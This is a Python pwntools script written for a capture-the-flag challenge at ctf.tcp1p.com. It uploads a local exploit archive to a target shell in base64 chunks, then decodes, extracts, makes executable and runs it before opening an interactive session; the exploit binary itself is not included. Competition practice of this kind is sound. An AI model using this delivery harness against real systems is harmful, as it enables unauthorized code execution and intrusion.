#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import base64

from pwn import *


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 10000"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process(["./run.sh"] + argv, env=env, *a, **kw)


def run(cmd: str):
    io.sendlineafter(b"$ ", cmd.encode())


with open("./exploit.tar.gz", "rb") as f:
    payload = base64.b64encode(f.read()).decode()


env = {}
context.log_level = "INFO"
io = start()
# io = process(["./run.sh"])

with log.progress("Uploading") as prog:
    for i in range(0, len(payload), 512):
        prog.status(f"{i:x} / {len(payload):x}")
        run(f"echo -n '{payload[i:i+512]}' >> b64exp")

run("base64 -d b64exp > exploit.tar.gz")
run("rm b64exp")
run("tar xzf ./exploit.tar.gz")
run("chmod +x exploit")
run("./exploit")

context.log_level = "DEBUG"
io.interactive()
